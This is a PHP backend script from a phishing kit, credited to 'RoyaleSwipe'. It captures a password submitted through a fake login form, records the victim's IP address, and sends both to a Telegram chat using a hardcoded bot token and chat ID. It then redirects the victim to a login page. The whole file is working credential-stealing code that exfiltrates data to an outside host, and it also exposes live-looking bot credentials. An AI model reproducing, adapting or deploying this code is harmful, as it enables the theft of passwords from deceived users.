<?php

#IP Address by RoyaleSwipe | t.me/royaleswipe

function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

#Send Log Details to Telegram
$telegram = "on";

$a = $_POST["royaleswipe_password"];
$b = $_SERVER['REMOTE_ADDR'];

$data = "|========== [ FIRST PASSWORD ] ==========|\n
🔐 Password: $a \n
🌐 IP Address: $b \n
|========== [ END FIRST PASSWORD ] ==========|";

$txt = $data;
$chat_id = "-1001712485865"; // Your Telegram Chat ID
$bot_url = "bot5750060113:AAG1435WVY3YHg7y2p2Du0jDigANPHG4rtU"; //Your Telegram Bot Api Key

if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

header("location: login/index.html");
